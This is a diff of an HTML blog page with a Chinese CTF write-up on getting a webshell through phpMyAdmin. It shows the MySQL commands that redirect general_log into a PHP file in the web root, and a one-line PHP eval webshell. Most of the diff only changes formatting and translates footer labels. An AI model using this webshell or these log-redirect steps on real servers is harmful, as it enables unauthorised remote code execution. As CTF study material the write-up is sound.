@@ -119,9 +119,7 @@
 <ol>
 <li>百度到一种绕过file_priv写shell的方法： <a href="https://www.cnblogs.com/xishaonian/p/6622818.html" target="_blank" rel="noopener">phpmyadmin通过日志文件拿到webshell</a></li>
 <li>接下来我们要找路径，我们可以通过找Log变量猜测绝对路径：<br><img src="https://s1.ax1x.com/2018/06/20/CzxNJH.png" alt="tupian"></li>
-<li>有一点需要注意我们写小马的时候[]中尽量用双引号，否则会有转义的麻烦，我这次写的一句话是这样的：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&quot;hpdoger&quot;]); ?&gt;</span><br></pre></td></tr></table></figure>
-
-</li>
+<li>有一点需要注意我们写小马的时候[]中尽量用双引号，否则会有转义的麻烦，我这次写的一句话是这样的：<pre><code>&lt;?php eval($_POST[&quot;hpdoger&quot;]); ?&gt;</code></pre></li>
 </ol>
 <h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>set global general_log=’on’;<br>set global general_log_file=’G:/apm/apache2/htdocs/config.php’;</p>
 <p>这个log的路径自己发挥，想办法找可写路径。可以看一下log变量原来有没有路径</p>
@@ -133,16 +131,16 @@
            
             <div class="copyright">
                 <div class="name">
-                    <a>本文作者:</a>
+                    <a>Author:</a>
                     <a>Sōsuke</a>
                 </div>
                 <div class="link">
-                    <a>本文链接:</a>
+                    <a>Link:</a>
                     <a class="permalink" href="https://hpdoger.cn/2018/06/20/一道SCTF写日志getshell/">https://hpdoger.cn/2018/06/20/一道SCTF写日志getshell/</a>
                 </div>
                 <div class="license">
-                    <a>版权声明:</a>
-                    <a>本博客所有文章除特别声明外，均采用许可协议 CC BY-NC-SA 3.0 CN。转载请注明出处！</a>
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                 </div>
             </div>
             
@@ -155,7 +153,7 @@
 
 <div class="tip">
 <button class="tip-btn">
-    打赏
+    Tip
 </button>
 <div class="tip-img">
 <ul>
@@ -174,7 +172,7 @@
 <div></div>
 
     <div class="next">
-    <a href="/2018/06/06/Web题目/"> CTF中的Web题目 </a>
+    <a href="/2018/06/06/WhaleCTF的Web题目/"> WhaleCTF的Web题目 </a>
     </div>
     
 </div>
